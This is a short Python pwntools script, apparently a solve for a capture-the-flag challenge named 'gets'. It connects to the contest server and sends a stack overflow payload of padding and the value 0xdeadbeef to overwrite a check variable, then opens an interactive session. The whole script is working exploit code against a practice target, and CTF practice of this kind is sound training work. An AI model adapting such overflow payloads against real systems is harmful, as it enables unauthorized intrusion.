from pwn import *

DEBUG = False

if DEBUG:
    r = process('./gets')
    gdb.attach(r)
else:
    r = remote('gets.litctf.live', 1337)

print(r.recvuntil("stand?"))

payload = "Yes"+"\x00"*37+p64(0xdeadbeef)

r.sendline(payload)

print(r.recv())

r.interactive()